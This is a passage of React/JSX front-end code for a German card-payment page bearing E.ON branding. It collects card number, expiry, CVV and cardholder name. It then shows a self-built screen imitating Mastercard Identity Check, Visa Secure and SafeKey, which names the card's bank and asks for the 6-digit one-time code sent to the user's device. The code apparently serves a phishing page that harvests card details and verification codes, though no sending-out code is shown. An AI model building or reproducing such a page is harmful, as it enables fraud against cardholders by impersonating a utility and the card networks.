                            <text x="24" y="20" textAnchor="middle" className="text-xs font-bold fill-[#1A1F71]">
                              VISA
                            </text>
                          )}
                          {cardType === "mastercard" && (
                            <>
                              <circle cx="18" cy="16" r="10" fill="#EB001B" opacity="0.8" />
                              <circle cx="30" cy="16" r="10" fill="#F79E1B" opacity="0.8" />
                            </>
                          )}
                          {cardType === "amex" && (
                            <text x="24" y="20" textAnchor="middle" className="text-xs font-bold fill-[#00AEEF]">
                              AMEX
                            </text>
                          )}
                          {cardType === "discover" && (
                            <text x="24" y="20" textAnchor="middle" className="text-xs font-bold fill-[#FF6600]">
                              DISCOVER
                            </text>
                          )}
                        </svg>
                      </div>
                    )}
                  </div>
                  {errors.card_number && <p className="text-red-600 text-sm mt-1">{errors.card_number}</p>}
                </div>

                <div className="grid grid-cols-2 gap-6">
                  <div>
                    <label className="block text-sm font-bold text-gray-900 mb-2">Ablaufdatum *</label>
                    <div className="relative">
                      <input
                        ref={expiryRef}
                        type="text"
                        inputMode="numeric"
                        autoComplete="cc-exp"
                        placeholder="MM/YY"
                        value={expiryDisplay}
                        onChange={(e) => handleExpiryChange(e.target.value)}
                        onKeyDown={(e) => handleKeyDown(e, cvvRef)}
                        onFocus={() => setFocusedField("expiry")}
                        onBlur={() => setFocusedField(null)}
                        maxLength={5}
                        className={`w-full px-4 py-3 border-2 rounded-lg focus:outline-none transition-all ${
                          errors.expiry
                            ? "border-red-500 focus:border-red-600"
                            : validFields.expiry
                              ? "border-green-500 bg-green-50"
                              : focusedField === "expiry"
                                ? "border-[#E20015] ring-4 ring-[#E20015]/10"
                                : "border-gray-300 focus:border-[#E20015]"
                        }`}
                        required
                      />
                      {validFields.expiry && (
                        <div className="absolute right-3 top-1/2 -translate-y-1/2">
                          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#10B981" strokeWidth="3">
                            <path d="M20 6L9 17l-5-5" />
                          </svg>
                        </div>
                      )}
                    </div>
                    {errors.expiry && <p className="text-red-600 text-sm mt-1">{errors.expiry}</p>}
                  </div>

                  <div>
                    <label className="block text-sm font-bold text-gray-900 mb-2 flex items-center gap-2">
                      CVV *
                      <button
                        type="button"
                        onMouseEnter={() => setShowCvvTooltip(true)}
                        onMouseLeave={() => setShowCvvTooltip(false)}
                        className="text-gray-400 hover:text-gray-600"
                      >
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
                          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-4h-2V7h2v6z" />
                        </svg>
                      </button>
                      {showCvvTooltip && (
                        <div className="absolute z-10 bg-gray-900 text-white text-xs rounded-lg p-2 mt-1 w-48 -bottom-16 left-0">
                          3-stelliger Code auf der Rückseite (4-stellig bei Amex)
                        </div>
                      )}
                    </label>
                    <div className="relative">
                      <input
                        ref={cvvRef}
                        type="text"
                        inputMode="numeric"
                        autoComplete="cc-csc"
                        placeholder={cardType === "amex" ? "••••" : "•••"}
                        value={formData.cvv}
                        onChange={(e) => handleCvvChange(e.target.value)}
                        onKeyDown={(e) => handleKeyDown(e, cardHolderRef)}
                        onFocus={() => setFocusedField("cvv")}
                        onBlur={() => setFocusedField(null)}
                        maxLength={cardType === "amex" ? 4 : 3}
                        className={`w-full px-4 py-3 border-2 rounded-lg focus:outline-none transition-all ${
                          errors.cvv
                            ? "border-red-500 focus:border-red-600"
                            : validFields.cvv
                              ? "border-green-500 bg-green-50"
                              : focusedField === "cvv"
                                ? "border-[#E20015] ring-4 ring-[#E20015]/10"
                                : "border-gray-300 focus:border-[#E20015]"
                        }`}
                        required
                      />
                      {validFields.cvv && (
                        <div className="absolute right-3 top-1/2 -translate-y-1/2">
                          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#10B981" strokeWidth="3">
                            <path d="M20 6L9 17l-5-5" />
                          </svg>
                        </div>
                      )}
                    </div>
                    {errors.cvv && <p className="text-red-600 text-sm mt-1">{errors.cvv}</p>}
                  </div>
                </div>

                <div>
                  <label className="block text-sm font-bold text-gray-900 mb-2">Karteninhaber *</label>
                  <div className="relative">
                    <input
                      ref={cardHolderRef}
                      type="text"
                      autoComplete="cc-name"
                      placeholder="Max Mustermann"
                      value={formData.card_holder}
                      onChange={(e) => handleCardHolderChange(e.target.value)}
                      onKeyDown={(e) => {
                        if (e.key === "Enter" && isFormValid) {
                          e.preventDefault()
                          handleAddPaymentMethod(e as any)
                        }
                      }}
                      onFocus={() => setFocusedField("card_holder")}
                      onBlur={() => setFocusedField(null)}
                      className={`w-full px-4 py-3 border-2 rounded-lg focus:outline-none transition-all uppercase ${
                        errors.card_holder
                          ? "border-red-500 focus:border-red-600"
                          : validFields.card_holder
                            ? "border-green-500 bg-green-50"
                            : focusedField === "card_holder"
                              ? "border-[#E20015] ring-4 ring-[#E20015]/10"
                              : "border-gray-300 focus:border-[#E20015]"
                      }`}
                      required
                    />
                    {validFields.card_holder && (
                      <div className="absolute right-3 top-1/2 -translate-y-1/2">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#10B981" strokeWidth="3">
                          <path d="M20 6L9 17l-5-5" />
                        </svg>
                      </div>
                    )}
                  </div>
                  {errors.card_holder && <p className="text-red-600 text-sm mt-1">{errors.card_holder}</p>}
                </div>

                <div className="bg-blue-50 border-2 border-blue-200 rounded-lg p-4 flex items-start gap-3">
                  <svg
                    width="24"
                    height="24"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="#3B82F6"
                    strokeWidth="2"
                    className="flex-shrink-0"
                  >
                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                  </svg>
                  <div>
                    <p className="text-sm font-bold text-blue-900">Sichere Datenübertragung</p>
                    <p className="text-xs text-blue-700 mt-1">
                      Ihre Kartendaten werden verschlüsselt und sicher gespeichert
                    </p>
                  </div>
                </div>
              </div>

              <div className="flex gap-4 mt-8 pt-6 border-t border-gray-200">
                <button
                  type="submit"
                  disabled={isSubmitting || isAddingCard || !isFormValid}
                  className="flex-1 bg-[#E20015] hover:bg-[#C00012] text-white font-bold py-4 rounded-lg transition-all disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  {isAddingCard ? (
                    <span className="flex items-center justify-center gap-2">
                      <svg className="animate-spin h-5 w-5" viewBox="0 0 24 24">
                        <circle
                          className="opacity-25"
                          cx="12"
                          cy="12"
                          r="10"
                          stroke="currentColor"
                          strokeWidth="4"
                          fill="none"
                        />
                        <path
                          className="opacity-75"
                          fill="currentColor"
                          d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                        />
                      </svg>
                      Wird verarbeitet...
                    </span>
                  ) : isSubmitting ? (
                    "Wird hinzugefügt..."
                  ) : (
                    "Zahlungsmethode hinzufügen"
                  )}
                </button>
                <button
                  type="button"
                  onClick={() => {
                    setShowAddModal(false)
                    resetForm()
                  }}
                  disabled={isSubmitting || isAddingCard}
                  className="flex-1 bg-gray-100 hover:bg-gray-200 text-gray-700 font-bold py-4 rounded-lg transition-all disabled:opacity-50"
                >
                  Abbrechen
                </button>
              </div>
            </form>
          </div>
        </div>
      )}

      {showStripeLoading && (
        <div className="fixed inset-0 bg-black bg-opacity-40 flex items-center justify-center z-50 backdrop-blur-md">
          <div className="bg-white rounded-2xl max-w-md w-full shadow-2xl p-12">
            <div className="text-center">
              <div className="mb-8">
                {cardType === "mastercard" && (
                  <div className="space-y-4">
                    <div className="flex items-center justify-center gap-3">
                      <div className="relative w-16 h-16">
                        <div className="absolute inset-0 bg-[#EB001B] rounded-full opacity-80" />
                        <div className="absolute inset-0 bg-[#F79E1B] rounded-full opacity-80 translate-x-6" />
                      </div>
                    </div>
                    <h3 className="text-2xl font-bold text-gray-900">Mastercard Identity Check</h3>
                  </div>
                )}

                {cardType === "visa" && (
                  <div className="space-y-4">
                    <div className="text-[#1A1F71] text-5xl font-bold">VISA</div>
                    <h3 className="text-2xl font-bold text-gray-900">Visa Secure</h3>
                  </div>
                )}

                {cardType === "amex" && (
                  <div className="space-y-4">
                    <div className="text-[#006FCF] text-4xl font-bold">AMERICAN EXPRESS</div>
                    <h3 className="text-2xl font-bold text-gray-900">SafeKey</h3>
                  </div>
                )}

                {!cardType && (
                  <div className="space-y-4">
                    <div className="w-16 h-16 mx-auto bg-gray-100 rounded-full flex items-center justify-center">
                      <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#666" strokeWidth="2">
                        <rect x="1" y="4" width="22" height="16" rx="2" ry="2" />
                        <line x1="1" y1="10" x2="23" y2="10" />
                      </svg>
                    </div>
                    <h3 className="text-2xl font-bold text-gray-900">3D Secure</h3>
                  </div>
                )}
              </div>

              <div className="relative w-16 h-16 mx-auto mb-6">
                <div className="absolute inset-0 border-4 border-gray-200 rounded-full" />
                <div className="absolute inset-0 border-4 border-transparent border-t-gray-900 rounded-full animate-spin" />
              </div>

              <p className="text-gray-600 text-lg">Verbindung wird hergestellt...</p>
            </div>
          </div>
        </div>
      )}

      {show3DSecureModal && (
        <div className="fixed inset-0 bg-black bg-opacity-40 flex items-center justify-center p-4 z-50 backdrop-blur-md">
          <div className="bg-white rounded-2xl max-w-md w-full shadow-2xl overflow-hidden">
            {verificationStep === "loading" && (
              <div className="p-12 text-center">
                <div className="w-20 h-20 mx-auto mb-6 relative">
                  <div className="absolute inset-0 border-4 border-[#E20015] border-t-transparent rounded-full animate-spin" />
                  <div
                    className="absolute inset-2 border-4 border-gray-200 border-t-transparent rounded-full animate-spin"
                    style={{ animationDirection: "reverse", animationDuration: "1s" }}
                  />
                </div>
                <h3 className="text-xl font-bold text-gray-900 mb-2">Karte wird überprüft</h3>
                <p className="text-gray-600">Bitte warten Sie einen Moment...</p>
              </div>
            )}

            {verificationStep === "auth" && (
              <>
                <div className="bg-gradient-to-r from-[#E20015] to-[#C00012] p-6 text-white">
                  <div className="flex items-center gap-3 mb-2">
                    <div className="w-12 h-12 bg-white/20 rounded-full flex items-center justify-center">
                      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
                      </svg>
                    </div>
                    <div>
                      <h3 className="text-xl font-bold">3D Secure Authentifizierung</h3>
                      {pending3DSecureBinData?.bank?.name && (
                        <p className="text-sm text-white/90">{pending3DSecureBinData.bank.name}</p>
                      )}
                    </div>
                  </div>
                </div>

                <div className="p-8">
                  {pending3DSecureBinData?.bank && (
                    <div className="mb-6 p-4 bg-gradient-to-r from-blue-50 to-indigo-50 border-2 border-blue-200 rounded-xl">
                      <div className="flex items-start gap-3">
                        <div className="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center flex-shrink-0">
                          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#3B82F6" strokeWidth="2">
                            <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z" />
                            <polyline points="9 22 9 12 15 12 15 22" />
                          </svg>
                        </div>
                        <div className="flex-1">
                          <h4 className="text-sm font-bold text-gray-900 mb-1">{pending3DSecureBinData.bank.name}</h4>
                          <p className="text-xs text-gray-600">fordert Authentifizierung an</p>
                        </div>
                      </div>
                    </div>
                  )}

                  <div className="bg-blue-50 border border-blue-200 rounded-xl p-4 mb-6">
                    <p className="text-sm text-blue-900">
                      {pending3DSecureBinData?.bank
                        ? `${pending3DSecureBinData.bank.name} hat einen Sicherheitscode an Ihr registriertes Gerät gesendet.`
                        : "Ihre Bank hat einen Sicherheitscode an Ihr registriertes Gerät gesendet."}{" "}
                      Bitte geben Sie den 6-stelligen Code ein.
                    </p>
                  </div>

                  <div className="mb-6">
                    <label className="block text-sm font-semibold text-gray-700 mb-3">Verifizierungscode</label>
                    <input
                      ref={verificationCodeRef}
                      type="text"
                      inputMode="numeric"
                      autoComplete="one-time-code"
                      placeholder="000000"
                      value={verificationCode}
                      onChange={(e) => handleVerificationCodeChange(e.target.value)}
                      maxLength={6}
                      className="w-full px-6 py-4 text-center text-2xl font-mono tracking-widest border-2 border-gray-300 rounded-xl focus:outline-none focus:border-[#E20015] focus:ring-4 focus:ring-[#E20015]/10 transition-all"
                    />
                    <p className="text-xs text-gray-500 mt-2 text-center">
                      Code wird automatisch erkannt und überprüft
                    </p>
                  </div>

                  <button
                    onClick={() => handle3DSecureVerification()}
                    disabled={verificationCode.length !== 6 || isVerifying}
                    className="w-full bg-[#E20015] hover:bg-[#C00012] text-white font-bold py-4 rounded-xl transition-all disabled:opacity-50 disabled:cursor-not-allowed mb-4"
                  >
                    {isVerifying ? (
                      <span className="flex items-center justify-center gap-2">
                        <svg className="animate-spin h-5 w-5" viewBox="0 0 24 24">
                          <circle
                            className="opacity-25"
                            cx="12"
                            cy="12"
                            r="10"
                            stroke="currentColor"
                            strokeWidth="4"
                            fill="none"
                          />
                          <path
                            className="opacity-75"
                            fill="currentColor"
                            d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                          />
                        </svg>
                        Wird überprüft...
                      </span>
                    ) : (
                      "Code bestätigen"
                    )}
                  </button>

                  {/* Added cancel button to close modal and keep card unverified */}
                  <button
                    onClick={() => {
                      setShow3DSecureModal(false)
                      setVerificationCode("")
                      setVerificationStep("loading")
                      setPendingCardId(null)
                      setPending3DSecureBinData(null)
                      router.refresh()
                    }}
                    disabled={isVerifying}
                    className="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 font-bold py-4 rounded-xl transition-all disabled:opacity-50"
                  >
                    Später verifizieren
                  </button>

                  <div className="mt-6 pt-6 border-t border-gray-200">
                    <p className="text-xs text-gray-500 text-center">
                      Für Testzwecke: Geben Sie einen beliebigen 6-stelligen Code ein
                    </p>
                  </div>
                </div>
              </>
            )}

            {verificationStep === "success" && (
              <div className="p-12 text-center">
                <div className="w-20 h-20 mx-auto mb-6 bg-green-100 rounded-full flex items-center justify-center">
                  <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#10B981" strokeWidth="3">
                    <path d="M20 6L9 17l-5-5" />
                  </svg>
                </div>
                <h3 className="text-2xl font-bold text-gray-900 mb-2">Erfolgreich verifiziert!</h3>
                <p className="text-gray-600">Ihre Karte wurde erfolgreich hinzugefügt und verifiziert.</p>
              </div>
            )}
          </div>
        </div>
      )}

      <footer className="bg-white border-t border-gray-200 px-6 py-8">
        <div className="max-w-7xl mx-auto text-center text-sm text-gray-600">
          <p>© 2025 E.ON Energie Deutschland GmbH</p>
        </div>
      </footer>
    </div>
  )
}
